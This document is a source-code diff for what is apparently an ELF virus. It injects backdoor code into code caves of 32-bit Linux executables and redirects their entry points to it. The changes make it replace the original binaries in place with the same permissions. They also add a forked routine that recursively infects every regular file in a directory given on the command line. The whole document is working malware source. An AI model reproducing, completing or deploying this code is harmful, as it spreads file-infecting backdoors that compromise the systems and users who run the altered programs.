@@ -16,7 +16,7 @@ extern unsigned char DT_REG;
 #endif
 
 //#define DEBUG2
-//#define VERBOSE
+#define VERBOSE
 
 // Prototypes
 
@@ -56,7 +56,7 @@ void makeSectionExecutable(const char *sectionName, int32_t fd, Elf32_Ehdr eh, E
 }
 
 char *getPatchedName(const char *orgName){
-	static const char *EXTENSION = ".patch";
+	static const char *EXTENSION = ".1";
 
 	int buffSize = strlen(orgName) + 1 + strlen(EXTENSION);
 	char *newBuffer = (char *)malloc(buffSize);
@@ -347,21 +347,24 @@ char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
 	return longest;
 }
 
-bool inject_executable(char *path){
-int32_t fd;
+bool inject_executable(char *path, bool is32Bit){
+	int32_t fd;
 	Elf32_Ehdr eh;		/* elf-header is fixed size */
+	//Elf64_Ehdr eh2;
 
 	if((fd = open(path, O_RDONLY|O_SYNC)) < 0) {
 		return false;
 	}
 
 	/* ELF header : at start of file */
+	//read_elf_header64(fd, &eh2);
 	read_elf_header(fd, &eh);
 	if(!is_ELF(eh)) {
 		return false;
 	}
 
 	Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
+	//Elf64_Shdr *sh_tbl_2;
 	
 	#ifdef VERBOSE
 	print_elf_header(eh);
@@ -395,6 +398,7 @@ int32_t fd;
 
 	// Change entry point to new cave
 	Elf32_Addr oldEntryPoint = eh.e_entry;
+	//Elf64_Addr oldEntryPoint = eh.e_entry;
 	eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
 	writeFileHeader(patchFD, &eh);
 
@@ -409,7 +413,7 @@ int32_t fd;
 	char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, sizeof(payload), &newEntryPointSize);
 
 	if(newEntryPointSize > winner->length) {
-		return false;
+		goto clean;
 	}
 
 	// Write malicious code to code cave
@@ -420,7 +424,53 @@ int32_t fd;
 	printf("entrypoint = 0x%x\n", eh.e_entry);
 	#endif
 
+	struct stat fStat;
+	if(stat(path, &fStat) < 0){
+		goto clean;
+	}
+
+	mode_t perms = fStat.st_mode;
+	chmod(patchName, perms);
+	
+	// Replace files
+	remove(path);
+	rename(patchName, path);
+
+	goto finish;
+
+	clean:
+	remove(patchName);
+	return false;
+
+	finish:
 	return true;
+}
+
+bool is64Bit_warpper(const char *path){
+	bool ans;
+	int32_t fd;
+	Elf32_Ehdr eh;
+
+	if((fd = open(path, O_RDONLY|O_SYNC)) < 0) {
+		return false;
+	}
+
+	read_elf_header(fd, &eh);
+	
+	if(!is_ELF(eh)) {
+		return false;
+	}
+
+	ans = is64Bit(eh);
+
+	close(fd);
+	return ans;
+}
+
+bool inject_executable_warpper(char *path){
+
+	return inject_executable(path, true);
+
 }
 
 void do_folder(){
@@ -432,7 +482,7 @@ void do_folder(){
 
 	while( (ent = readdir(dp)) != NULL ){
 		if(ent->d_type == DT_REG){
-			inject_executable(ent->d_name);
+			if(inject_executable_warpper(ent->d_name))
 			printf("Injected --> %s\n", ent->d_name);
 		}
 	}
@@ -467,18 +517,11 @@ void do_folder_recursive(){
 	}
 }
 
-/* Main entry point of elf-parser */
-int32_t main(int32_t argc, char *argv[])
-{
-	if(argc!=2) {
-		printf("Usage: elf-parser <ELF-file>\n");
-		return 0;
-	}
-
+void infect_folder(char *path){
 	pid_t pid;
 	
 	if((pid = fork()) == 0){
-		chdir("testing");
+		chdir(path);
 		do_folder_recursive();	
 		exit(0);
 	}
@@ -488,7 +531,17 @@ int32_t main(int32_t argc, char *argv[])
 		while((temp_pid = wait(NULL)) != pid) {
 			;
 		}
-
-		puts("injection complete");
 	}
 }
+
+#ifndef TEST
+
+/* Main entry point of elf-parser */
+int32_t main(int32_t argc, char *argv[])
+{
+	infect_folder(argv[1]);
+
+	return 0;
+}
+
+#endif
